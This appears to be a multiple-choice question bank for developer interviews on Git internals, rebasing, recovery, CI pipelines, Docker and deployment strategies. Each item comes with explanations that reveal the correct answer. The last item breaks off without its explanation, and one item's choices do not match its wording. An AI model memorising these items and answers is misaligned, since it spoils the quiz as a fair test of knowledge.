title: Git, tooling, CI/CD and deployment
blurb: Branching, undoing mistakes, what the pipeline does, containers and environments. Everyone claims to know Git — this is where that gets tested.

questions.q: What is the difference between merge and rebase?
choices: Merge adds a commit joining both histories; rebase replays your commits onto the other branch as new ones
Rebase keeps the original commit hashes and only moves the branch label, so it is safe on shared branches
Merge squashes the feature branch into one commit, while rebase keeps every commit exactly as it was
The history ends up identical; rebase just avoids the conflicts that merging the same branches would raise
questions.why: Rebase creates new commits with new hashes, which is why it gives linear history and why you never rebase a branch others have pulled: their copies and yours diverge. It does not avoid conflicts either; you resolve them commit by commit instead of once.
questions.asked: Guaranteed in any Git discussion; the 'never rebase shared branches' caveat is the part the interviewer is waiting for.

questions.q: You committed to `main` instead of a feature branch and have not pushed. What is the cleanest fix?
choices: Stash the commit, switch to a new branch, and pop the stash there to move the work
Run `git commit --amend` on main, which moves the latest commit onto a new branch
Create a branch at the current commit, then reset main back to `origin/main`
Check out a new branch; the commit moves with you and main drops back on its own
questions.why: `git branch feature` keeps a pointer to the commit, then `git reset --hard origin/main` on main moves main back. Checking out a new branch copies the pointer but leaves main where it is, and stash only holds uncommitted changes, not commits.
questions.asked: A practical scenario that shows whether you understand branches as movable pointers rather than folders of commits.

questions.q: What is the difference between `git revert` and `git reset`?
choices: revert deletes the commit from history; reset keeps it but unstages the files it changed
reset is the safe choice for pushed commits, because it leaves the remote history untouched
revert only undoes the latest commit; reset can undo any commit further back in history
revert adds a new commit that undoes a change; reset moves the branch pointer back instead
questions.why: revert is additive, so it is safe on a shared branch. reset rewrites where the branch points, so after a push everyone else's history disagrees with yours and someone ends up force-pushing. revert can target any commit, not just the latest.
questions.asked: The follow-up is always "and if it is already pushed?"; answering revert without prompting is the signal.

questions.q: What do `git reset --soft`, `--mixed` and `--hard` each do with your changes?
choices: soft moves only the index, mixed moves HEAD and the index, hard also deletes untracked files
soft keeps them staged, mixed keeps them in the working tree unstaged, hard discards them
All three keep your changes; they differ only in whether the reflog records the move
soft and mixed leave HEAD where it is; only hard actually moves the branch pointer
questions.why: All three move the branch pointer; they differ in what happens to the index and working tree. `--hard` throws away uncommitted changes to tracked files, but it leaves untracked files alone (that is `git clean`). Commit or stash before reaching for it.
questions.asked: `--hard` is the command people run when panicking; knowing exactly what it destroys is the point.

questions.q: What is `git stash` for?
choices: Saving a copy of the current branch to the remote so it survives a lost laptop
Squashing your recent local commits into one before opening a pull request
Shelving uncommitted changes so you can switch branches, then reapplying them
Keeping a file's local edits out of every future commit, like a private ignore
questions.why: Stash stores work-in-progress as local refs and restores it with `git stash pop`. It is never pushed, so it does not protect against a lost machine, which is why a throwaway WIP commit on a pushed branch is often the safer habit.
questions.asked: A warm-up question; a good answer adds that stashes are local and easy to forget.

questions.q: Which of these does a `.gitignore` NOT do?
choices: Stop tracking a file that is already committed; that needs `git rm --cached`
Apply its patterns to files in subfolders below the .gitignore's own folder
Match only directories when the pattern ends with a trailing slash
Keep new untracked files that match its patterns out of `git status`
questions.why: .gitignore only affects untracked files. A file already in the index stays tracked until you remove it with `git rm --cached`. If that file was a secret, ignoring it now does nothing: it is still in history, so rotate the credential.
questions.asked: It usually comes up as "someone committed the .env file"; the strong answer ends with "rotate the key".

questions.q: What makes a good commit message?
choices: A line-by-line account of how the code changed, so reviewers can skip the diff
A short imperative summary, plus a body explaining why when it is not obvious
The ticket number alone, because the ticket tracker already holds the context
A list of every file touched and the functions changed in each, for searching
questions.why: The diff already says how and which files. Months later `git log` is the only record of why, and trackers get migrated or purged, so a bare ticket number often leads nowhere. The ticket id is fine as an addition, not a replacement.
questions.asked: Interviewers look at your public commits; this checks whether you write history for the next person.

questions.q: What is `git bisect` for?
choices: Splitting one large commit into two smaller ones so each can be reviewed alone
Comparing two branches side by side to list the commits that exist on only one of them
Cutting a subfolder out into its own repository with its history preserved
Binary-searching commits between a good and a bad one to find where a bug began
questions.why: You mark one good and one bad commit and Git checks out the midpoint each round until one commit is left; `git bisect run` automates it with a test script. It is why small commits pay off: landing on a 2,000-line commit tells you little.
questions.asked: A proxy for debugging maturity; people who have used it in anger usually mention `bisect run`.

questions.q: Which checks should gate a merge to main if main must always be releasable?
choices: Build, lint, type-check and the automated test suites, all passing on the branch
Only the fast unit tests; integration tests can run nightly after the merge lands
A full production deploy of the branch, so every merge is proven on real traffic
Formatting and lint only, because reviewers verify behaviour by reading the code
questions.why: Whatever must be true for a release has to be checked before the merge, or main is only releasable until someone breaks it. Nightly-only integration tests let a broken main sit for a day, and deploying every branch to production is not a gate at all.
questions.asked: Checks that you see CI as the definition of "mergeable", not a nice-to-have.

questions.q: What is the difference between continuous integration and continuous deployment?
choices: CI builds every push; continuous deployment means a human approves each release first
CI is the test phase and CD the build phase; together they replace manual QA
CI merges and verifies changes often; continuous deployment ships every green build
CI runs on feature branches only; CD re-runs the same checks after merge to main
questions.why: Continuous delivery means every build could be released; continuous deployment means it actually is, without a human gate. A manual approval step is delivery, not deployment, and many good teams stop there on purpose.
questions.asked: Tests whether you can separate delivery from deployment, which most candidates blur.

questions.q: What is a container, precisely?
choices: A lightweight virtual machine that boots its own minimal kernel for each app
An isolated process on the host kernel, with its own filesystem view and namespaces
A compressed archive of the app and its dependencies that the OS unpacks and runs
A process supervisor that restarts the app on a crash and caps it to a set amount of memory
questions.why: Containers share the host kernel and are isolated with namespaces and cgroups. That is why they start in milliseconds, and why a Linux container on Windows or macOS needs a Linux VM underneath. The archive is the image, not the container.
questions.asked: The 'it is not a VM' distinction is the whole question.

questions.q: What is the point of a multi-stage Dockerfile?
choices: Build with the full SDK image, then copy only the output into a small runtime image
Build one image for several CPU architectures, such as amd64 and arm64, in a single run
Run several processes, such as the app and a worker, inside a single container
Share cached layers between different projects' builds on the same CI runner
questions.why: Each `FROM` starts a stage, and only the last stage becomes the image. A .NET SDK image is several times the size of the runtime image, so shipping only the runtime pulls faster and gives a scanner less to flag. Multiple architectures is buildx, a separate feature.
questions.asked: A standard Docker question; mentioning a smaller attack surface as well as size is the stronger answer.

questions.q: Why copy `package.json` and install dependencies before copying the rest of the source in a Dockerfile?
choices: It makes the image smaller, because source is compressed along with the dependencies
Docker requires dependency steps to come before any COPY of application code
Layer caching: a source-only change then reuses the cached dependency-install layer
It speeds the container up at runtime, because dependencies load before app code
questions.why: A layer is rebuilt when its inputs change, and so is every layer after it. If the whole source is copied before `npm ci`, every one-line edit reinstalls every dependency. Order has no effect on runtime speed and Docker imposes no such rule.
questions.asked: Checks whether you understand the layer cache, which is what makes a Docker build take ten seconds or three minutes.

questions.q: How should configuration differ between dev, staging and production if you must ship exactly what you tested?
choices: Build a separate artefact per environment with that environment's settings baked in
Build one artefact and inject each environment's settings as variables at deploy time
Commit one config file per environment and choose between them at runtime from the hostname
Keep one config file and have the deployer edit it for each environment by hand
questions.why: Build once and promote the same artefact; only its configuration changes. Rebuilding per environment means the thing you tested is not the thing you shipped, and hostname switches or hand edits turn configuration into code nobody reviews.
questions.asked: Build-once-promote-many is the principle; interviewers want to hear why rebuilding per environment is a risk.

questions.q: What is a blue/green deployment?
choices: Deploying the same version to two regions so that one can take over whenever the other fails
Sending a small share of users to the new version and raising it step by step
Releasing half the features first and the rest once the first half proves stable
Running the new version beside the old, moving all traffic, and moving it back on failure
questions.why: Rollback is a traffic switch, not a redeploy. Gradually shifting a percentage of users is a canary release, a different strategy. The catch is shared state: the database must work with both versions during the overlap.
questions.asked: Often paired with canary; being able to tell them apart is the mid-level bar.

questions.q: What is a feature flag for?
choices: Separating deploy from release, so unfinished code can ship switched off
Choosing which Git branch a build comes from without editing the pipeline
Running A/B experiments; outside experiments a flag is just dead code
Skipping failing tests in CI until someone has time to fix them properly
questions.why: Flags let you merge small changes to main continuously while the feature stays off for users. Experiments are one use, not the only one. The cost is flag debt: every flag needs an owner and a removal date.
questions.asked: Leads into trunk-based development; mentioning flag cleanup shows you have lived with them.

questions.q: The pipeline is green but production is broken. What class of problem is this most likely to be?
choices: A flaky test that happened to pass in CI and would fail on a second run
Something only the target environment has: config, secrets, data, network or scale
A merge conflict that was resolved wrongly on main after the pipeline had already run
A compiler or bundler bug that produces different output on the build server
questions.why: The pipeline validates the artefact, not the environment it lands in. That is why post-deploy smoke tests and observability matter more here than one more unit test. A flaky test passing by luck can hide a code bug, but it is rare; a green build that breaks only in production nearly always points at what production alone has.
questions.asked: A realistic scenario that tests whether you understand the limits of CI.

questions.q: What does semantic versioning promise?
choices: MAJOR marks a rewrite, MINOR marks new features, PATCH marks any other change
MAJOR breaks compatibility, MINOR adds features compatibly, PATCH fixes compatibly
Each number counts releases per year, month and day, so it encodes the date
The registry enforces compatibility, so a MINOR bump can never break your app
questions.why: It is a promise the publisher makes, not something any tool enforces, which is why lockfiles exist: a MINOR release can still break you by mistake. Calendar versioning is a different scheme.
questions.asked: Leads straight into `^` ranges and lockfiles; the strong answer says semver is a promise, not a guarantee.

questions.q: What is trunk-based development?
choices: Everyone commits straight to main, with no pull requests and no review
One long-lived branch per release, with fixes merged back to main at the end
All work happens in personal forks and is merged back to main once at the end of each sprint
Short-lived branches merged to main at least daily, with main kept releasable
questions.why: Branches live for hours or a day, so merges stay small and integration pain never builds up. It does not mean skipping review; short-lived PRs still get reviewed. The trade-off is that unfinished work must hide behind flags.
questions.asked: Tests whether you know why long-lived branches hurt, not just the name of the alternative.

questions.q: Someone force-pushed over your commits on a shared branch. Are they gone?
choices: Yes; a force-push deletes the old commits from the server and every clone at once
Only if you had tagged them, because untagged commits vanish on the next push
Usually not: the reflog on any clone that had them still points at the old SHAs
Only a server backup can help, since Git keeps no record of where a branch pointed
questions.why: Git does not delete objects straight away, and the reflog records where each ref has been, so `git reflog` on a machine that had the commits finds them. The real fix is protecting shared branches so nobody can force-push there.
questions.asked: A calm "check the reflog" is the answer; the follow-up is how you stop it happening again.

questions.q: What is the difference between `npm install` and `npm ci`?
choices: ci is a faster install that reuses node_modules and skips the integrity check
install may rewrite the lockfile; ci installs exactly from it and fails on a mismatch
ci installs only production dependencies, while install adds devDependencies too
install picks the newest versions in range; ci pins them by writing a new lockfile
questions.why: `npm ci` deletes node_modules and reproduces the lockfile exactly, failing if package.json and the lockfile disagree. That is what a pipeline wants: a surprise upgrade should be an error. It installs devDependencies too unless told to omit them.
questions.asked: A quick check that you have set up a real pipeline rather than copied one.

questions.q: What does a linter give you that the compiler does not?
choices: Type checking of arguments and return values across module boundaries
Faster builds, because linted code needs less optimising by the compiler
Rules for legal-but-suspicious code and style, applied the same way to every change
A security audit that flags known-vulnerable dependency versions pinned in the lockfile
questions.why: Rules such as `no-floating-promises` or the React hooks rules catch real bugs in code that compiles. Type checking is the compiler's job and dependency audits are `npm audit`. Automating style also removes the least useful kind of review comment.
questions.asked: Checks that you use tooling to take arguments out of code review.

questions.q: Why should build output and `node_modules` stay out of version control?
choices: Git cannot store binary files, so compiled output would be corrupted on checkout
They are derived, large and platform-specific, and cause constant merge conflicts
Committing them makes the linter and formatter scan thousands of extra files
Package licences forbid redistributing third-party code inside a Git repository
questions.why: Commit the recipe (package.json and the lockfile), not the result. Native modules built on your machine may not even run on the build server. Git stores binaries fine; it just cannot diff or merge them usefully.
questions.asked: A junior hygiene check; the lockfile-is-the-recipe framing is what lands.

questions.q: What is a rolling deployment's main constraint?
choices: It needs a maintenance window, because every instance restarts at the same moment
It only works for containers, because VMs cannot be replaced one at a time
Old and new versions serve traffic together, so both must work with one schema
It cannot be rolled back, because updated instances cannot take the old build
questions.why: Instances are replaced a few at a time, so for a while both versions run against the same database and clients. That is why you never rename a column in the same release as the code: add, backfill, switch reads, then remove, across several deploys.
questions.asked: It connects deployment strategy to database migrations, which is a genuinely mid-level connection to make.

questions.q: What is the difference between `git fetch` and `git pull`?
choices: fetch downloads remote commits without moving your branch; pull fetches and then integrates
fetch downloads only the latest commit; pull downloads the full history of every branch
fetch updates your working files but not your branch; pull also moves the branch pointer forward
fetch is the read-only form of push; pull is the same as clone for an existing folder
questions.why: fetch updates remote-tracking refs such as `origin/main` and touches nothing else, so you can inspect before integrating. pull is fetch followed by a merge (or rebase, if configured). Neither is limited to one commit.
questions.asked: A phone-screen staple; people who fetch first and look before pulling tend to have fewer bad merges.

questions.q: Your local main has one unpushed commit and the remote has two new ones. What does `git pull --rebase` do?
choices: Creates a merge commit for the remote work, then rebases that merge onto yours
Discards your local commit and resets main to match the remote, like a hard reset
Fetches the two commits, then replays your commit on top of them for a linear history
Refuses to run, because rebasing a branch that has unpushed work is never allowed
questions.why: It fetches, then rebases your unpushed commit onto the updated `origin/main`, so there is no "Merge branch main" noise. Your commit gets a new hash, which is fine because nobody else has it yet.
questions.asked: Checks that you can apply "rebase only what is not shared" to a daily command.

questions.q: What does `git cherry-pick <sha>` do?
choices: Moves that commit off its original branch onto yours, removing it from the source
Checks out the repository as it was at that commit, detaching HEAD for inspection
Merges the whole branch containing that commit, stopping right after that commit
Applies the changes from that one commit as a new commit on your current branch
questions.why: It copies the change, not the commit: you get a new commit with a new hash, and the original stays where it was. The usual use is taking one fix from main onto a release branch.
questions.asked: Usually framed as "ship one fix to the release branch without the rest of main".

questions.q: Your team squash-merges pull requests. What does that do to main's history?
choices: Each PR's commits are replayed onto main one by one with their original hashes
Each PR lands as one new commit on main; the individual branch commits stay off main
Main gets a two-parent merge commit, so the branch's own commits all stay reachable from main
The branch is rebased onto main first, then each commit is fast-forwarded in order
questions.why: Squash-merge combines the diff into a single new commit on main, so main reads one commit per PR. A merge commit keeps the branch commits reachable; rebase-merge replays them with new hashes. Branches built on top of a squashed branch then conflict, because Git sees different commits.
questions.asked: Teams pick a merge strategy on purpose; knowing the three options and their trade-offs is expected.

questions.q: After a merge conflict, a file contains `<<<<<<<`, `=======` and `>>>>>>>` lines. What do they mark?
choices: Lines Git merged automatically, left in so you can check its choice before committing
Your side above `=======` and the incoming side below it; you edit, then stage the file
Lines deleted on both branches, kept only until `git merge --continue` removes them
A corrupted file that must be restored with `git checkout` before the merge can go on
questions.why: Between `<<<<<<<` and `=======` is the version on your current branch (HEAD); below it is the incoming change. You edit the file to the intended result, remove the markers, `git add` it and continue the merge. During a rebase the sides swap: HEAD is the branch you are rebasing onto and the incoming side is your own commit.
questions.asked: A junior question; the follow-up is what you do when you are not sure which side is right (ask the other author).

questions.q: What is a Git tag typically used for?
choices: Labelling a branch so CI knows which environment that branch should deploy to
Marking a commit for review; a tagged commit cannot merge until someone approves
Grouping related commits so they can be reverted together in a single operation
Naming a specific commit, such as `v2.3.0`, so that release can always be rebuilt
questions.why: A tag is a fixed name for one commit, unlike a branch, which moves. Annotated tags also record who tagged it and when, and many pipelines publish a release when a version tag is pushed.
questions.asked: Checks that you know a tag, unlike a branch, never moves.

questions.q: Which setting reliably stops a change with a failing build from being merged into main?
choices: Branch protection on main that requires a pull request and passing status checks
A pre-commit hook in the repo that runs the tests on each developer's machine
A CODEOWNERS file naming the team leads who must review every change to main
A `.gitattributes` rule marking main as read-only for everyone except the CI user
questions.why: Only the server can enforce it. Hooks are not installed by cloning and can be skipped with `--no-verify`, and CODEOWNERS decides who reviews, not whether CI passed. Required checks plus no direct pushes make "green before merge" a rule, not a habit.
questions.asked: Separates people who have configured a repository from people who have only used one.

questions.q: Your CI caches the npm download cache between runs. What should the cache key be derived from?
choices: The branch name, so each branch keeps its own warm cache for its whole lifetime
The commit SHA, so every commit starts from a fresh cache nothing has tainted
A fixed string, so the cache always hits and packages are never downloaded twice
A hash of the lockfile, plus OS and Node version, so a dependency change busts it
questions.why: The key should change exactly when the inputs change. A per-commit key never hits, and a fixed key serves stale packages forever. Cache `~/.npm` rather than `node_modules` when you use `npm ci`, because `npm ci` deletes `node_modules` anyway.
questions.asked: Pipeline speed is a real cost; a correct cache key shows you have tuned one rather than copied a template.

questions.q: Why do teams replace long-lived cloud access keys stored as CI secrets with OIDC federation?
choices: CI secrets are shown in plain text to anyone who can open the repository's settings
The job trades a signed identity token for credentials that expire in about an hour
Cloud providers block static keys used from CI runners, because runner IPs change
OIDC encrypts the keys at rest, whereas CI secrets sit unencrypted on the runner
questions.why: A stored key works from anywhere until someone rotates it, so one leaked log line or malicious workflow step is a long-term breach. With OIDC the provider trusts a token scoped to that repository and branch and issues short-lived credentials. CI secrets are encrypted and write-only in the UI, so that is not the problem.
questions.asked: A modern pipeline-security question; the strong answer names the blast radius of a key that never expires.

questions.q: Your deploy pulls `myapp:latest`. Why do teams deploy by version tag or image digest instead?
choices: `latest` is only a movable label, so two nodes can run different images and rollback has no target
Registries delete images tagged `latest` after a day, so a restarted node may find nothing to pull at all
`latest` is resolved once when the service is created, so later pushes are never picked up
Images tagged `latest` skip the registry vulnerability scan, so pinning is a security rule
questions.why: A tag points wherever it was last pushed, so a node that restarts tomorrow may pull a different image from the one it replaced. A digest (`@sha256:…`) is immutable, so every node runs the same bytes and rolling back means naming the previous digest.
questions.asked: Tests whether you think about reproducible deploys, not just successful ones.

questions.q: You rebased your own feature branch and must push it. Why prefer `git push --force-with-lease` over `--force`?
choices: It force-pushes only the commits whose hashes changed and leaves every other remote commit untouched
It rebases the remote branch onto yours before pushing, so both sides end up with the same history
It fails if the remote branch moved since your last fetch, so you cannot overwrite a teammate's commits
It asks the server to keep the old commits reachable for 30 days, so an overwritten push can be recovered
questions.why: `--force` overwrites whatever the remote has. `--force-with-lease` compares the remote ref with your remote-tracking copy and rejects the push if someone pushed in between, which is exactly the case where a force-push destroys work. It changes nothing about what is pushed or kept: Git has no built-in server-side retention, and it does not rebase for you. Running `git fetch` right before it refreshes the lease and defeats the check.
questions.asked: Follows naturally from 'never rebase shared branches'; the strong answer knows the check is against your last fetch, not the server's current state.

questions.q: In Git's object model, what is a branch such as `feature/login`?
choices: A copy of every file as it stood when the branch was created
A movable pointer: a ref holding the SHA of one commit
A list of the commit ids that were made while it was checked out
A separate object database that shares nothing with main
questions.why: A branch is a ref, a tiny file (or packed-refs line) containing one commit SHA; committing moves it forward. The commits it 'contains' are simply everything reachable by following parents from that commit, which is why creating a branch is instant and costs nothing.
questions.asked: A warm-up that reveals whether you have a model of Git or a list of memorised commands.

questions.q: Which four object types make up Git's object database?
choices: File, folder, snapshot and branch
Blob, diff, commit and ref
Blob, tree, commit and annotated tag
Blob, tree, patch object and remote-tracking ref
questions.why: Blobs hold file contents, trees map names to blobs and subtrees, commits point at one tree plus parents and metadata, and annotated tags point at an object with a message. Git stores snapshots, not diffs; branches and remotes are refs, not objects.
questions.asked: Used to check whether you know Git stores snapshots rather than diffs, which explains why many commands are cheap.

questions.q: You rename a file without changing its contents and commit. What happens in the object database?
choices: A new blob is stored under the new name and the old blob is deleted
Git records a rename object linking the old path to the new one
Nothing changes, because the commit only stores the diff of the rename
The same blob is reused; only the trees that list the name change
questions.why: Objects are addressed by a hash of their content, so identical content is the same blob. File names live in tree objects, so a rename produces new trees and a new commit. Git has no rename object: `git log --follow` and diff rename detection infer it by comparing content.
questions.asked: Probes content addressing; a strong answer mentions that rename detection is a heuristic, which is why huge edit-plus-rename commits lose history.

questions.q: What does `HEAD` normally contain?
choices: A symbolic reference to the current branch, such as `ref: refs/heads/main`
The SHA of the most recent commit pushed to the remote
The SHA of the commit you last checked out, whichever branch you happen to be on
The name of the remote branch your current branch is tracking
questions.why: HEAD usually points at a branch name, and the branch points at a commit, so committing moves the branch and HEAD follows. When HEAD holds a raw SHA instead, you are in detached HEAD state. The upstream is branch configuration, not HEAD.
questions.asked: Sets up the detached HEAD follow-up; knowing HEAD is usually indirect makes that state easy to explain.

questions.q: You run `git checkout v1.4.0` to inspect a release, make a fix and commit it. What is the risk?
choices: The commit is rejected, because tags are read-only snapshots
The commit silently moves the `v1.4.0` tag to your new commit
The commit is on no branch; switch away and only the reflog can find it
The commit is added to main, because tags always belong to main
questions.why: Checking out a tag detaches HEAD. Commits made there are real but no branch points at them, so once you switch away they are unreachable except via the reflog and eventually garbage-collected. Run `git switch -c hotfix-1.4` first to keep them.
questions.asked: Tests whether 'detached HEAD' scares you or you know exactly what it means and how to keep the work.

questions.q: You ran `git reset --hard HEAD~3` and realise you needed those commits. None were pushed. How do you get them back?
choices: They are gone, because `--hard` deletes the commit objects immediately
Find the old tip in `git reflog` and `git reset --hard` to that entry
Run `git revert HEAD~3` to reapply the three removed commits
Use `git stash pop`, because `--hard` stashes what it discards
questions.why: Reset only moves the branch pointer; the commits still exist, and the reflog records where HEAD was, so `git reset --hard HEAD@{1}` (or the SHA from the reflog) restores them. Revert creates inverse commits and stash is unrelated. Uncommitted changes wiped by `--hard` are the part you cannot recover this way.
questions.asked: The classic 'I broke my branch' question; interviewers want the word reflog and the caveat about uncommitted work.

questions.q: How long does a commit that is only reachable from the reflog survive by default?
choices: Until the next `git push`, which prunes anything unreachable from the remote
Forever, because Git never deletes objects without a manual `git gc`
Until the terminal session ends, as the reflog lives in memory
About 30 days before reflog expiry, then until a later gc prunes it
questions.why: Reflog entries for commits no longer reachable from any ref expire after 30 days by default (`gc.reflogExpireUnreachable`), reachable ones after 90; the automatic `git gc` then prunes the loose objects. The reflog is a file in `.git/logs`, and pushing never deletes local objects.
questions.asked: Distinguishes people who have actually recovered work from people who say 'Git never loses anything'.

questions.q: A teammate asks you to recover commits they lost with `reset --hard`. Why can you not use your own clone's reflog?
choices: The reflog is local: it records movements of refs in one repository only
The reflog needs the same Git version on both machines to be read
Reflogs are pushed only when `push.reflog` is enabled on the remote
Your reflog does have them, but only an admin can read other users' entries
questions.why: Each clone keeps its own reflog of its own ref movements; nothing about it is shared by push or fetch. If the commits were never pushed, only their machine has them. If they were pushed, your remote-tracking branch or your reflog of it may still reference the old tip.
questions.asked: Checks that you understand what is local and what is shared, which is the root of most Git confusion.

questions.q: What is the difference between `HEAD~2` and `HEAD^2`?
choices: They are synonyms for the commit two steps back
`HEAD~2` is two commits back; `HEAD^2` is the commit made two days before HEAD
`HEAD~2` counts back on the remote; `HEAD^2` counts back locally
`HEAD~2` is the first-parent grandparent; `HEAD^2` is a merge's second parent
questions.why: `~n` walks n generations along first parents. `^n` selects the nth parent of a single commit, which only exists for merges, so `HEAD^2` is the tip of the branch that was merged in. On a non-merge commit `HEAD^2` fails to resolve.
questions.asked: Comes up when reverting or diffing merges; the strong answer mentions it matters only for merge commits.

questions.q: What does `git log main..feature` list?
choices: Commits on either branch but not on both
Commits reachable from `feature` that are not reachable from `main`
Commits on `main` that were made after `feature` branched off from it
Every commit between the oldest and newest of the two branch tips
questions.why: Two dots mean 'reachable from the right, excluding anything reachable from the left', which is exactly what a pull request would add. Three dots (`main...feature`) give the symmetric difference, commits on either side but not both.
questions.asked: Useful day to day for 'what is in this branch that is not released yet', and a good check of range syntax.

questions.q: Why does a pull request diff usually match `git diff main...feature` rather than `git diff main feature`?
choices: Three dots include uncommitted changes from your working tree
Two dots ignore whitespace changes, which review tools want to show
Three dots diff from the merge base, so new commits on main are not shown
Two dots compare only the first commit of each branch
questions.why: `git diff A...B` compares the merge base of A and B with B, so it shows only the branch's own changes. The two-argument form compares the tips directly, so anything merged into main since you branched appears as if your branch had reverted it.
questions.asked: Explains a real confusion: 'why does my diff show changes I did not make?' after main moves on.

questions.q: You rebase a branch with three commits onto the latest main. What happens to the commit SHAs?
choices: They are unchanged, because the file changes in each commit are the same
Only the first commit gets a new SHA; the others keep theirs
They change only if a conflict had to be resolved during the rebase
All three get new SHAs, because each now has a different parent
questions.why: A commit's id hashes its tree, parents, author, committer and message, so replaying it on a new base creates a new commit even when the patch is identical. That is why rebasing shared commits forces everyone else to reconcile a history that no longer matches theirs.
questions.asked: The mechanism behind 'do not rebase shared branches', which interviewers want explained rather than recited.

questions.q: During `git rebase main`, a conflict stops the rebase. In `git checkout --ours file`, what is 'ours'?
choices: The version from main, the base being replayed onto
The version from your feature branch commit being replayed
The version from the merge base of the two branches
The version currently saved in your working directory
questions.why: Rebase works by checking out the new base and applying your commits onto it, so 'ours' is the branch you are rebasing onto and 'theirs' is your own commit. It is the reverse of a merge, where 'ours' is your checked-out branch.
questions.asked: A favourite trap because the answer is counter-intuitive; knowing why (rebase replays onto the base) is the strong answer.

questions.q: You need to fix a typo in the second-to-last commit of your unpushed branch. What is the tidy way?
choices: Run `git commit --amend`, which edits any commit you name
Commit with `--fixup=<sha>`, then `git rebase -i --autosquash`
Revert the commit and make a corrected copy of it
Reset to that commit with `--hard` and redo the last commit by hand
questions.why: `--fixup` creates a commit titled `fixup! <subject>`, and `--autosquash` moves it next to its target and marks it to be folded in. `--amend` only rewrites the latest commit. Revert leaves both the mistake and the correction in history.
questions.asked: Shows you keep reviewable history without heroics; people who know autosquash usually know interactive rebase well.

questions.q: In an interactive rebase todo list, what is the difference between `squash` and `fixup`?
choices: `squash` merges the commit into the next one; `fixup` into the previous
`squash` keeps the author; `fixup` makes you the author of the result
`squash` combines messages for editing; `fixup` keeps only the earlier one
`squash` needs a clean working tree; `fixup` works with local changes
questions.why: Both fold the commit into the one above it in the list. `squash` opens an editor with both messages combined; `fixup` discards the folded commit's message. Neither changes which commit it folds into or requires different working-tree state.
questions.asked: Basic interactive-rebase fluency; the follow-up is usually 'when would you tidy history before a PR'.

questions.q: Your branch was cut from `release-2` but should target `main`. Which command moves only your own commits?
choices: It replays the commits after `release-2` up to `my-feature` onto main
It merges `release-2` into main and then rebases `my-feature` on top
It moves `release-2` onto main and leaves `my-feature` untouched
It copies all of `release-2`'s history into main before your commits
questions.why: `--onto <newbase> <upstream> <branch>` takes the commits in `upstream..branch` and replays them onto newbase. A plain `git rebase main` would also drag across every release-2 commit not on main, which is exactly what you want to avoid.
questions.asked: Separates people who use rebase from people who understand it; also the fix for stacked branches after a squash merge.

questions.q: You are halfway through a messy rebase and want to go back to exactly where you started. What do you run?
choices: `git reset --hard HEAD~1`
`git rebase --skip`
`git rebase --abort`
`git checkout main`
questions.why: `--abort` restores the branch and working tree to their pre-rebase state. `--skip` drops the current commit and carries on, and a reset of one commit only undoes one replayed step. After a finished rebase, `ORIG_HEAD` or the reflog gets you back.
questions.asked: Low-stakes but telling: people who know the escape hatch are far less afraid of rebase.

questions.q: A rebase finished, but the result is wrong. Which ref usually points at the branch tip from before it?
choices: `FETCH_HEAD`
`ORIG_HEAD`
`MERGE_HEAD`
`HEAD@{upstream}`
questions.why: Rebase, reset and merge record the previous tip in `ORIG_HEAD`, so `git reset --hard ORIG_HEAD` undoes them if you have not run another such command since. `FETCH_HEAD` is what was last fetched and `MERGE_HEAD` exists only during a merge.
questions.asked: A quick recovery shortcut; the strong answer adds that the reflog is the fallback once ORIG_HEAD has moved.

questions.q: You amend a commit that you already pushed to your own PR branch. What happens on the next plain `git push`?
choices: It is rejected as non-fast-forward, because the pushed commit was replaced
It succeeds and the remote keeps both versions of the commit
It succeeds, because amending keeps the original commit's SHA
It pushes a new merge commit joining the old and amended versions
questions.why: Amending creates a new commit with a new SHA whose parent is the old commit's parent, so the remote branch is no longer an ancestor of yours. You must force-push, ideally with `--force-with-lease`, which is fine on your own branch and harmful on a shared one.
questions.asked: Connects amend to rewriting history, which many juniors do without realising.

questions.q: `git stash pop` hits a conflict. What state are you left in?
choices: The pop is cancelled and your working tree is untouched
The stash is applied with markers and deleted, so resolve carefully
The stash is applied with conflict markers and kept in the stash list
The conflicting files are skipped and the rest are applied cleanly
questions.why: When the apply conflicts, Git leaves conflict markers and deliberately does not drop the entry, printing 'The stash entry is kept in case you need it again'. Resolve, then `git stash drop` yourself. A dropped stash can still be found with `git fsck --unreachable` for a while.
questions.asked: Everyday situation; the strong answer knows the stash is kept and needs a manual drop.

questions.q: You run `git stash`, then `git status` still shows a new untracked file. Why?
choices: The file is ignored by `.gitignore`, so stash skips it
Stash only saves files that are staged with `git add`
The stash failed, because untracked files block it
Stash saves tracked changes only unless you pass `-u`
questions.why: By default stash saves modifications to tracked files, staged or not, and leaves untracked files alone. `git stash -u` includes untracked files and `-a` also includes ignored ones. The file is simply not tracked yet, which is different from ignored.
questions.asked: Explains a common 'why did my switch carry this file along' moment.

questions.q: What is the modern, single-purpose command to discard unstaged changes to one file?
choices: `git reset --hard file.ts`
`git restore file.ts`
`git revert file.ts`
`git clean file.ts`
questions.why: Git 2.23 split `checkout` into `switch` (branches) and `restore` (files); `git restore file.ts` resets the working copy from the index, and `--staged` unstages. `reset --hard` does not take paths, revert works on commits, and clean removes untracked files.
questions.asked: Shows you know current Git rather than only the overloaded `checkout`.

questions.q: You accidentally committed `.env` a month ago and have now added it to `.gitignore`. It still shows as modified. Why?
choices: `.gitignore` only takes effect after `git gc` runs
`.gitignore` is read from main only, not your branch
`.gitignore` only affects untracked files; run `git rm --cached .env`
`.gitignore` patterns need a leading slash before they match dotfiles like `.env`
questions.why: Ignore rules stop untracked files being added; a tracked file stays tracked. `git rm --cached` stops tracking it while keeping it on disk. The secret is still in history, so it must be rotated regardless of any history rewrite.
questions.asked: Very common; the strong answer adds 'and rotate the secret, because history still has it'.

questions.q: A secret was pushed to a public repository an hour ago. What must you do first?
choices: Rewrite history with `git filter-repo` and force-push every branch
Revoke and rotate the secret, then decide whether to rewrite history
Make the repository private so the commit is no longer reachable
Delete the branch the commit is on and open a fresh one
questions.why: Public pushes are scraped by bots within minutes, so assume it is compromised and rotate it now. Rewriting history is secondary: forks, clones, caches and PR refs keep the old commit, and deleting a branch or going private does not unpublish what was already fetched.
questions.asked: Judgement over commands: the wrong answer spends an hour on filter-repo while the key is being used.

questions.q: Why do many teams add a `.git-blame-ignore-revs` file after running a formatter over the codebase?
choices: So `git blame` can skip those commits and show the real author of each line
So the formatting commits are excluded from `git log` and releases
So CI skips re-running the formatter and linter on those particular commits
So reviewers are not asked to approve the formatting commits
